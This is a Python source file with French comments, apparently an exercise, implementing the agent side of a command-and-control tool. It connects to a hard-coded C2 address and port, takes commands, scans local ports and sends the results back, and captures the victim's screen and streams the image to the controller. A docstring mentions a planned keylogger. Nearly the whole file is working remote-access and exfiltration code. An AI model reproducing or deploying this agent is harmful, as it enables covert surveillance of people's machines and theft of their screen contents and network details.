"""
    Coté agent ou client y'a besoin de socket et de subprocess 
    - regarder la librairie socket y'a un mot clé pour te connecter à un serveur sur le même port et qui permet d'envoyer le resultat sur la commande
    Le scanner de port se trouve ici et il ressemble à celui deja fait mais avec un twist qui est d'envoyer le résultat au C2
    Une partie du keylogger ici
    Screenshot ici mais image doit etre coté serveur
    Y'a que 3 fonction de socket : scoket, connect et receive
"""


import socket as s
import os
# from PIL import ImageGrab
import pyautogui


C2_ADDR = '10.1.179.158'  #Adresse IP du serveur
C2_PORT = 28964        #Le même port que server


def port_scan():
    #Scan des ports locaux
    open_ports = [] #Liste des ports ouverts
    for port in range(1, 1025): #Ports de 1 à 1024
        with s.socket(s.AF_INET, s.SOCK_STREAM) as S: #Crée un socket
            S.settimeout(0.5) #Timeout de 0.5 secondes
            result = S.connect_ex(("localhost", port)) #Connexion au port
            if result == 0:
                open_ports.append(port) #Si la connexion est réussi, ajoute le port à la liste
    return f"Ports ouverts : {open_ports}"


def take_screenshot():
    #Capture l'écran et enregistre l'image
    try:
        screenshot = pyautogui.screenshot()  #Capture l'écran
        path = "screenshot.png"              #Chemin où enregistrer le screenshot
        screenshot.save(path)                #Sauvegarde de l'image
        print(f"[Screenshot sauvegardé dans {path}")
        return path                          #Retourne le chemin de l'image
    except Exception as e:
        print(f"Erreur capture d'écran : {e}")
        return None                         #Retourne rien si y'a une erreur


def send_screenshot(agent_socket, file_path):
    #Envoie le screenshot au serveur
    try:
        #Taille du fichier
        file_size = os.path.getsize(file_path) #Récupère la taille du fichier
        agent_socket.sendall(f"{file_size}".encode())  #Envoie la taille du fichier
        agent_socket.recv(1024)  #Attendre que le serveur reçoit le fichier
        
        #Envoi du fichier image en morceaux de 1024 octets pour éviter des erreurs ou des pertes
        with open(file_path, "rb") as file:
            while chunk := file.read(1024):  #Lit par blocs de 1024 octets
                agent_socket.sendall(chunk)  #Envoie chaque bloc
    
    except Exception as e:
        print(f"fichier mal ou pas envoyer/reçu : {e}")
    
    
def start_agent():
    #Crée une connexion avec le serveur et attend les commandes
    agent_socket = s.socket(s.AF_INET, s.SOCK_STREAM)

    try:
        agent_socket.connect((C2_ADDR, C2_PORT))  #Connexion au serveur
        print(f"Connecté au serveur sur {C2_ADDR}:{C2_PORT}")
    
    except ConnectionError:
        print("Impossible de se connecter au serveur.")
        return
    
    #Recevoir des commandes du serveur
    while True:
        try:
            command = agent_socket.recv(1024).decode()  #Attente une commande du serveur

            #Exécute un scan des ports locaux
            if command == "scan":
                result = port_scan() #Scan des ports
                agent_socket.send(result.encode()) #Envoie le résultat du scan
            
            #Capture et envoie un screenshot
            elif command == "screenshot":
                screenshot_path = take_screenshot() #Capture l'écran
                if screenshot_path:
                    send_screenshot(agent_socket, screenshot_path) #Envoie le screenshot

            #Déconnexion demandée par le serveur
            elif command == "exit":
                print("Déconnexion demandée par le serveur.")
                break
            
            #Commande inconnue
            else:
                agent_socket.send(b"Commande inconnue")
        
        # Gestion des erreurs de connexion
        except ConnectionError:
            print("Connexion avec le serveur perdue.")
            break
    
    agent_socket.close()  # Ferme la connexion avec le serveur

if __name__ == "__main__":
    start_agent()


